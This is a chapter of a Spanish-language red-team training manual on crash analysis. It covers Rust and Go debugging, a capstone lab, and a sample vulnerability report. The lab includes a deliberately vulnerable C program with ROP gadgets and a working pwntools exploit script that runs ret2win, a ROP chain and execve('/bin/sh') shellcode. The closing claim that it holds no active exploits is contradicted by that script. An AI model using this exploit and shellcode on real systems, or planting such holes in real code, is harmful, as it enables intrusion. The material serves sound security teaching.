Rust ‐ Depuración con rust‐gdb:
# rust-gdb incluye pretty-printers para tipos de Rust
rust-gdb ./target/debug/rust_target
(gdb) break rust_begin_unwind
# Break en panic
(gdb) run < crash_input
(gdb) bt
# Backtrace con símbolos Rust
Go ‐ Análisis de Panics:
# Go genera stack traces automáticamente en panic
./go_target < crash_input 2>&1 | tee panic.log
# Race detector (para bugs de concurrencia)
go build -race -o target_race
./target_race < crash_input
# Depuración con Delve
dlv debug
(dlv) break main.vulnerableFunction
(dlv) continue
(dlv) stack
# Stack trace
(dlv) goroutines
# Ver todas las goroutines
Tabla Comparativa:
Aspecto
### C/C++
Rust
Go
Crash típico
### SIGSEGV, SIGABRT
Panic ﴾safe﴿,
SIGSEGV ﴾unsafe﴿
Panic

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Aspecto
### C/C++
Rust
Go
Info automática
Mínima
Stack trace, mensaje
Stack trace
completo
Sanitizers
### ASAN, MSAN, TSAN
ASAN ﴾nightly﴿, Miri
Race detector
Debugger
### GDB, LLDB
rust‐gdb, rust‐lldb
Delve
Frontera de ataque
Todo
unsafe, FFI
CGo, reflect
### 5.6.
### 4.7 Proyecto Capstone: Pipeline Completo de Análisis
### 5.6.1.
### 4.7.1 Escenario
Has completado sesiones de fuzzing en los targets del laboratorio y tienes crashes de: ‐ vulnera-
ble_suite.c ﴾test cases 1‐5﴿‐ vuln_http_server.c ﴾accesible por red﴿
Tu manager necesita un reporte identificando: 1. ¿Cuántos bugs únicos existen realmente? 2. ¿Cuá‐
les son explotables remotamente? 3. Scripts de PoC para los issues de mayor severidad.
### 5.6.2.
### 4.7.2 Binario con ROP Gadgets
Para ejercicios avanzados de explotación, usamos una versión mejorada con gadgets ROP embebi‐
dos:
// vulnerable_suite_rop.c - Versión con gadgets ROP para explotación
// Compilar: gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop.c -o vuln_rop
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
// ============================================================================
// GADGETS ROP - Sobreviven compilación con __attribute__((used))
// ============================================================================
// pop rdi; ret - Setear primer argumento (RDI)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rdi(void) {
__asm__ volatile ("pop %rdi\n" "ret\n");
}
// pop rsi; pop r15; ret - Setear segundo argumento (RSI)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rsi_r15(void) {
__asm__ volatile ("pop %rsi\n" "pop %r15\n" "ret\n");
}

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
// pop rdx; ret - Setear tercer argumento (RDX)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rdx(void) {
__asm__ volatile ("pop %rdx\n" "ret\n");
}
// jmp rsp - Saltar a shellcode en stack (requiere -z execstack)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_jmp_rsp(void) {
__asm__ volatile ("jmp * %rsp\n");
}
// syscall; ret - Syscall directa
__attribute__((naked, used, section(".text.gadgets")))
void gadget_syscall(void) {
__asm__ volatile ("syscall\n" "ret\n");
}
// pop rax; ret - Setear número de syscall
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rax(void) {
__asm__ volatile ("pop %rax\n" "ret\n");
}
// ============================================================================
// FUNCIONES WIN - Targets para demostrar explotación exitosa
// ============================================================================
void win(void) {
printf("\n========================================\n");
printf("
EXPLOTACIÓN EXITOSA!\n");
printf("
Redirigiste ejecución a win()\n");
printf("========================================\n\n");
exit(0);
}
void win_with_arg(long magic) {
if (magic == 0xdeadbeefcafebabe) {
printf("\n========================================\n");
printf("
EXPLOTACIÓN AVANZADA EXITOSA!\n");
printf("
Argumento correcto: 0x %lx\n", magic);
printf("========================================\n\n");
exit(0);
} else {
printf("[!] win_with_arg llamada con argumento incorrecto: 0x %lx\n", magic);
}
}

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
void spawn_shell(void) {
printf("[*] Spawning shell...\n");
execve("/bin/sh", NULL, NULL);
}
// Funciones vulnerables (igual que vulnerable_suite.c original)
void stack_overflow(char *input) {
char buffer[64];
strcpy(buffer, input);
// ¡Sin verificación de límites!
}
void print_gadgets(void) {
printf("\n=== Gadgets ROP Disponibles ===\n");
printf("pop rdi; ret
@
%p\n", (void*)gadget_pop_rdi);
printf("pop rsi; pop r15; ret @
%p\n", (void*)gadget_pop_rsi_r15);
printf("pop rdx; ret
@
%p\n", (void*)gadget_pop_rdx);
printf("pop rax; ret
@
%p\n", (void*)gadget_pop_rax);
printf("jmp rsp
@
%p\n", (void*)gadget_jmp_rsp);
printf("syscall; ret
@
%p\n", (void*)gadget_syscall);
printf("\n=== Funciones Win ===\n");
printf("win()
@
%p\n", (void*)win);
printf("win_with_arg(magic)
@
%p
(magic=0xdeadbeefcafebabe)\n", (void*)win_with_arg);
printf("spawn_shell()
@
%p\n", (void*)spawn_shell);
printf("\n=== Info de Explotación ===\n");
printf("Offset a RIP en stack overflow: 72 bytes\n");
printf("(64 bytes buffer + 8 bytes RBP guardado)\n\n");
}
int main(int argc, char **argv) {
setbuf(stdout, NULL);
if (argc < 2) {
printf("Usage:
%s <test> [input]\n", argv[0]);
printf("
1 <input>
- Stack overflow\n");
printf("

- Mostrar direcciones de gadgets\n");
return 1;
}
int test = atoi(argv[1]);
switch(test) {
case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;
case 6: print_gadgets(); break;
default: return 1;
}
return 0;
}
Compilación y Verificación:
cd ~/crash_analysis_lab

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
# Compilar versión para explotación
gcc -g -fno-stack-protector -no-pie -z execstack src/vulnerable_suite_rop.c -o vuln_rop
# Verificar gadgets con ropper
pip install ropper
ropper --file ./vuln_rop --search "pop rdi"
ropper --file ./vuln_rop --search "jmp rsp"
# Mostrar direcciones desde el binario
./vuln_rop 6
### 5.6.3.
### 4.7.3 Exploit de Explotación Completo
#!/usr/bin/env python3
"""
exploit_rop.py - Exploits para vuln_rop
Técnicas demostradas:
1. ret2win - Redirigir a win()
2. ROP chain - pop rdi + argumento + win_with_arg()
3. jmp rsp + shellcode
NOTA: Los bytes NULL en direcciones de 64-bit limitan
explotación via argv. Exploits reales usan stdin/socket.
"""
from pwn import *
import os
import subprocess
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_rop")
PAYLOAD_FILE = "/tmp/vuln_rop_payload"
class RopExploit:
def __init__(self):
os.chdir(LAB_DIR)
context.binary = TARGET
context.log_level = 'info'
self.gadgets = self._get_gadgets()
def _get_gadgets(self):
"""Parsear direcciones de gadgets del binario"""
try:
result = subprocess.run([TARGET, "6"], capture_output=True, text=True)
gadgets = {}
for line in result.stdout.split('\n'):
if '@' in line:

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
parts = line.split('@')
name = parts[0].strip()
addr_str = parts[1].strip().split()[0]
gadgets[name] = int(addr_str, 16)
return gadgets
except:
# Fallback - ajustar según tu compilación
return {
'pop rdi; ret': 0x401952,
'win()': 0x401256,
'win_with_arg(magic)': 0x4012b8,
'jmp rsp': 0x40196f,
}
def exploit_ret2win(self):
"""Simple ret2win - redirigir ejecución a win()"""
log.info("=== Exploit: ret2win ===")
offset = 72
win_addr = self.gadgets.get('win()', 0x401256)
payload = b"A" * offset
payload += p64(win_addr)
log.info(f"Payload: {offset} bytes padding + win() @ {hex(win_addr)}")
# Escribir payload a archivo (para evitar problemas con argv)
with open(PAYLOAD_FILE, 'wb') as f:
f.write(payload)
# Ejecutar via bash command substitution
cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'
p = process(['bash', '-c', cmd], cwd=LAB_DIR)
output = p.recvall(timeout=2).decode(errors='replace')
print(output)
if "EXPLOTACIÓN EXITOSA" in output:
log.success("ret2win exitoso!")
return True
return False
def exploit_rop_chain(self):
"""ROP chain: pop rdi; ret -> win_with_arg(0xdeadbeefcafebabe)"""
log.info("=== Exploit: ROP chain con argumento ===")
offset = 72
pop_rdi = self.gadgets.get('pop rdi; ret', 0x401952)
win_arg = self.gadgets.get('win_with_arg(magic)', 0x4012b8)

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
magic = 0xdeadbeefcafebabe
# Construir ROP chain
payload = b"A" * offset
payload += p64(pop_rdi)
# pop rdi; ret
payload += p64(magic)
# argumento para win_with_arg
payload += p64(win_arg)
# llamar win_with_arg
log.info(f"ROP chain:")
log.info(f"
pop_rdi
@ {hex(pop_rdi)}")
log.info(f"
magic
= {hex(magic)}")
log.info(f"
win_with_arg @ {hex(win_arg)}")
# NOTA: Esta técnica falla via argv porque bash strips null bytes
# En un exploit real, usarías stdin o socket
log.warning("ROP chain via argv tiene limitaciones de null bytes")
log.info("Ver código para técnica alternativa con GDB")
return False
def exploit_shellcode(self):
"""jmp rsp + shellcode (requiere -z execstack)"""
log.info("=== Exploit: jmp rsp + shellcode ===")
offset = 72
jmp_rsp = self.gadgets.get('jmp rsp', 0x40196f)
# Shellcode x86-64 execve("/bin/sh")
shellcode = asm('''
xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
syscall
''')
payload = b"A" * offset
payload += p64(jmp_rsp)
payload += shellcode
log.info(f"jmp rsp @ {hex(jmp_rsp)} -> {len(shellcode)} byte shellcode")
log.info("Este exploit spawneará un shell interactivo")

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
with open(PAYLOAD_FILE, 'wb') as f:
f.write(payload)
cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'
p = process(['bash', '-c', cmd], cwd=LAB_DIR)
p.interactive()
if __name__ == "__main__":
import sys
exploit = RopExploit()
if len(sys.argv) > 1:
cmd = sys.argv[1]
if cmd == "win":
exploit.exploit_ret2win()
elif cmd == "rop":
exploit.exploit_rop_chain()
elif cmd == "shell":
exploit.exploit_shellcode()
else:
# Demo ret2win por defecto
exploit.exploit_ret2win()
### 5.6.4.
### 4.7.4 Generación del Reporte Final
Para generar el reporte final, creamos un archivo Markdown estructurado:
cd ~/crash_analysis_lab/capstone
cat > reports/vulnerability_report.md << 'EOF'
[contenido del reporte - ver formato abajo]
### EOF
echo "Reporte guardado en reports/vulnerability_report.md"
Ejemplo de Reporte de Vulnerabilidades:
### 5.6.4.1.
Reporte de Análisis de Crashes: vulnerable_suite.c
Resumen Ejecutivo
El análisis de crashes de vulnerable_suite.c identificó 4 vulnerabilidades explotables únicas y
1 crash no explotable. Todas las vulnerabilidades explotables son locales pero demuestran clases
comunes de vulnerabilidades.
Metodología
1. Generación de Crashes: 28 inputs de crash en 5 test cases
2. Triage: Clasificación automatizada con CASR
3. Deduplicación: Reducción a 5 clusters únicos
4. Análisis: Causa raíz con ASAN y GDB

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
5. Minimización: Reducción a triggers mínimos
6. PoC Development: Scripts Python confiables
Hallazgos
Hallazgo 1: Stack Buffer Overflow ﴾CRÍTICO﴿
Atributo
Valor
Test Case

Severidad
### CRÍTICO
Clasificación CASR
### EXPLOITABLE
Causa Raíz
strcpy﴾﴿sin límites a buffer de 64 bytes
Impacto
Control de RIP, potencial RCE
Trigger Mínimo
73 bytes
Offset a RIP
72 bytes
PoC de demostración:
./vuln_no_protect 1 $(python3 -c "print('A'*72 + 'BBBBBBBB')")
# RIP = 0x4242424242424242
Hallazgo 2: Heap Buffer Overflow ﴾ALTO﴿
Atributo
Valor
Test Case

Severidad
### ALTO
Clasificación CASR
### EXPLOITABLE
Causa Raíz
strcpy﴾﴿sin límites a buffer de heap de 32 bytes
Impacto
Corrupción de metadatos del heap
Nota
Silencioso sin ASAN
Hallazgo 3: Use‐After‐Free ﴾ALTO﴿
Atributo
Valor
Test Case

Severidad
### ALTO
Clasificación CASR
### EXPLOITABLE
Causa Raíz
Puntero usado después de free﴾﴿
Impacto
Lectura/escritura arbitraria
Nota
Silencioso sin ASAN
Hallazgo 4: Double Free ﴾ALTO﴿
Atributo
Valor
Test Case

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
Atributo
Valor
Severidad
### ALTO
Clasificación CASR
### EXPLOITABLE
Causa Raíz
Mismo puntero liberado dos veces
Impacto
Corrupción del heap
Hallazgo 5: NULL Pointer Dereference ﴾BAJO﴿
Atributo
Valor
Test Case

Severidad
### BAJO
Clasificación CASR
### NOT_EXPLOITABLE
Causa Raíz
Desreferencia de puntero NULL
Impacto
DoS solamente
Recomendaciones
1. Stack Overflow: Reemplazar strcpy() con strncpy() o snprintf()
2. Heap Overflow: Agregar verificación de límites antes de copias
3. UAF: Setear punteros a NULL después de free, usar smart pointers
4. Double‐Free: Rastrear estado de allocación
5. NULL Deref: Agregar verificaciones NULL antes de desreferencias
Entregables
pocs/ ‐ Scripts PoC para cada vulnerabilidad
minimized/ ‐ Inputs de crash minimizados
casrep/ ‐ Reportes de análisis CASR
### 5.6.5.
### 4.7.5 Checklist del Capstone
┌──────────────────────────────────────────────────────────────────────────┐
│
### CHECKLIST DEL PROYECTO CAPSTONE
│
├──────────────────────────────────────────────────────────────────────────┤
│
│
### │SETUP
│
│[ ] Entorno de laboratorio configurado (~/.crash_analysis_lab/)
│
│[ ] Binarios compilados (vuln_no_protect, vuln_asan, vuln_rop)
│
│[ ] Herramientas instaladas (pwntools, CASR, ropper)
│
│
│
### │FASE 1: GENERACIÓN DE CRASHES
│
│[ ] 28+ inputs de crash generados
│
│[ ] Crashes categorizados por test case
│
│
│

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### │FASE 2: TRIAGE
│
│[ ] Reportes CASR generados para todos los crashes
│
│[ ] Crashes agrupados en 5 clusters únicos
│
│
│
### │FASE 3: ANÁLISIS
│
│[ ] Causa raíz identificada para cada bug único
│
│[ ] Evaluación de explotabilidad completada
│
│
### - 4 EXPLOITABLE, 1 NOT_EXPLOITABLE
│
│
│
### │FASE 4: MINIMIZACIÓN
│
│[ ] Tamaños de trigger mínimo encontrados
│
│[ ] Archivos minimizados guardados
│
│
│
│FASE 5: DESARROLLO DE PoC
│
│[ ] Suite de PoC Python creada
│
│[ ] Cada PoC probado para confiabilidad (>90%)
│
│[ ] PoC de explotación (ret2win) funcional
│
│
│
### │FASE 6: REPORTE
│
│[ ] Reporte de vulnerabilidades generado
│
│[ ] Severidades correctamente asignadas
│
│[ ] Recomendaciones de remediación incluidas
│
│
│
└──────────────────────────────────────────────────────────────────────────┘
### 5.7.
### 4.8 Conclusiones del Capítulo 4
### 5.7.1.
Principios Fundamentales
1. La reproducibilidad es obligatoria: Antes de cualquier análisis, asegurar que el crash sea
reproducible de manera confiable. Usar rr/TTD para crashes no determinísticos.
2. Los sanitizers son esenciales: ASAN, UBSAN y otros sanitizers convierten bugs silenciosos
en crashes informativos. Siempre usar builds con sanitizers para triage.
3. La automatización escala: Herramientas como CASR automatizan el triage de grandes corpus
de crashes. El pipeline manual no escala más allá de unos pocos bugs.
4. La minimización clarifica: Reducir el input al mínimo necesario facilita el análisis de causa
raíz y hace los PoCs más entendibles.
5. La explotabilidad depende del contexto: El mismo tipo de bug puede ser crítico o informa‐
cional dependiendo del control del atacante, las mitigaciones presentes, y la alcanzabilidad.

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
6. La documentación importa: Mantener registros claros de crashes, análisis, PoCs y conclusio‐
nes. Los buenos reportes facilitan la comunicación con desarrolladores.
### 5.7.2.
Tabla de Herramientas Clave
Herramienta
Propósito
Plataforma
WinDbg + TTD
Depuración con time travel
Windows
GDB + Pwndbg
Depuración orientada a exploits
Linux
### ASAN/UBSAN
Detección de bugs de memoria
Todas
### CASR
Clasificación y clustering
Linux
rr
Record and replay
Linux
Frida
Instrumentación dinámica
Todas
pwntools
Desarrollo de PoC/exploits
Python
afl‐tmin
Minimización de crashes
Linux
### 5.7.3.
Preguntas de Discusión
1. ¿Por qué el stack overflow requiere 72 bytes para controlar RIP ﴾no 64﴿?
2. ¿Cómo afectaría ASLR la explotación del stack overflow en vuln_protected?
3. ¿Por qué el NULL pointer dereference se clasifica como NOT_EXPLOITABLE mientras los otros
son EXPLOITABLE?
4. ¿Qué cambios serían necesarios para extender el análisis al target de red vuln_http_server?
5. ¿Cuáles son las consideraciones éticas al publicar código de PoC?
### 5.8.
Documentación y Estándares
CVSS v4.0 Specification
CWE ‐ Common Weakness Enumeration
MITRE ATT&CK Framework
NVD ‐ National Vulnerability Database
### 5.9.
Herramientas Principales
Herramienta
Propósito
### URL
### AFL++
Fuzzing guiado por cobertura
github.com/AFLplusplus/AFLplu
Honggfuzz
Fuzzing multi‐hilo
github.com/google/honggfuzz
Syzkaller
Fuzzing de kernel
github.com/google/syzkaller
Ghidra
Ingeniería reversa
ghidra‐sre.org
Ghidriff
Diffing binario
github.com/clearbluejar/ghidrif
Pwndbg
Extensión GDB
github.com/pwndbg/pwndbg
### CASR
Clasificación de crashes
github.com/ispras/casr

---

### CAPÍTULO 5. ANÁLISIS DE CRASHES
Bitácora Red Team
### 5.10.
Fuentes de Información de Vulnerabilidades
Google Project Zero Blog
Microsoft Security Response Center
CISA Known Exploited Vulnerabilities
Exploit‐DB
Fin del Documento
Este material es de carácter educativo y está destinado a investigadores de seguridad para propósitos
defensivos. No incluye instrucciones operativas peligrosas ni exploits activos.